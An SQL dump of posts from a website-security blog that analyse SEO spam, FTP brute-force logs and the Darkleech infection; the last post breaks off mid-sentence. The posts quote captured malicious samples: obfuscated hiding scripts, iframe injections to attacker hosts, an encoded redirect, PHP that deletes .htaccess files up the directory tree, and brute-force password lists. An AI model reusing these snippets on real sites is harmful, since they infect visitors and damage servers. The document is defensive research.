INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (127, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (128, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (129, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (130, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (131, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (132, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (133, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really 